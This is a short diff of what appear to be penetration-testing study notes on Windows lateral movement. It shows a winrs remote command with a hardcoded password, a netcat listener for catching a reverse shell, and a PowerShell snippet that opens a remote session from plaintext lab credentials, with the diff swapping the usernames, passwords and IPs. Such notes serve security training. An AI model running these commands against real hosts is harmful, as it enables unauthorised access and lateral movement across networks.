@@ -227,11 +227,11 @@ winrs -r:files04 -u:jen -p:Nexus123!  "result of previous cmd variable value"
 nc -lnvp 443
 
 Powershell Version:
-$username = 'jen';
-$password = 'Nexus123!';
+$username = 'joe';
+$password = 'Flowers1';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
-New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+New-PSSession -ComputerName 172.16.191.10 -Credential $credential
 Enter-PSSession 1(id)
 ```
 ###### Psexec
